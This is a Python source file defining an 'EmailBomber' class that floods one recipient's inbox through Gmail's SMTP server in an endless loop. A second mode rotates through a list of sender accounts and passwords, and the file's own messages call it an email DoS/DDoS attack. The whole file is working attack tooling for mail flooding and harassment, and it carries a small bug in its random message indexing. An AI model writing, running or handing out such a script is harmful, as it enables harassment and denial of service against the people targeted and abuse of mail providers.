import smtplib
from time import sleep
from datetime import datetime
import random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.header import Header


class EmailBomber:
	def __init__(self, receiver_email: str, subject: str, msg: str | list, is_html=False, pdf_attachment=None, min_interval=600, max_interval=600):
		self.receiver_email = receiver_email
		self.msg = msg
		self.subject = subject
		self.is_html = is_html
		self.pdf_attachment = pdf_attachment
		self.min_interval = min_interval
		self.max_interval = max_interval
		self.server = None

	def start_bombing(self, sender_email: str, sender_email_password: str):
		print("Press Ctrl + c to stop.")
		try:
			while True:
				self.send(sender_email, sender_email_password)
		except KeyboardInterrupt:
			print("Email Dos attack stopped!")
		finally:
			self.server.quit()

	def start_DDOS_bombing(self, email_and_passwords: list):
		print("Press Ctrl + c to stop.")
		try:
			while True:
				for sender_email, sender_email_password in email_and_passwords:
					self.send(sender_email, sender_email_password)
		except KeyboardInterrupt:
			print("Email DDos attack stopped!")
		finally:
			self.server.quit()

	def send(self, sender_email: str, sender_email_password: str):
		if self.is_html:
			message = MIMEMultipart()
			message.attach(MIMEText(self.msg if isinstance(self.msg, str) else self.msg[random.randint(0, len(self.msg))], 'html', 'utf-8'))
		else:
			message = MIMEText(self.msg if isinstance(self.msg, str) else self.msg[random.randint(0, len(self.msg))], 'plain', 'utf-8')

		message['From'] = Header(sender_email, 'utf-8')
		message['To'] = Header(self.receiver_email, 'utf-8')
		message['Subject'] = Header(self.subject, 'utf-8')

		if self.pdf_attachment:
			with open(self.pdf_attachment, 'rb') as pdf_file:
				pdf_attachment = MIMEApplication(pdf_file.read(), _subtype="pdf")
				pdf_attachment.add_header('Content-Disposition', f'attachment; filename={self.pdf_attachment}')
				message.attach(pdf_attachment)

		self.server = smtplib.SMTP('smtp.gmail.com', 587)
		self.server.starttls()
		self.server.login(sender_email, sender_email_password)

		self.server.sendmail(
			sender_email,
			self.receiver_email,
			message.as_string()
		)
		time = datetime.now()
		print(f"{sender_email} -> {self.receiver_email}  {time.day}.{time.month}.{time.year} {time.hour}:{time.minute}:{time.second}")

		random_time = random.randint(self.min_interval, self.max_interval)
		sleep(random_time)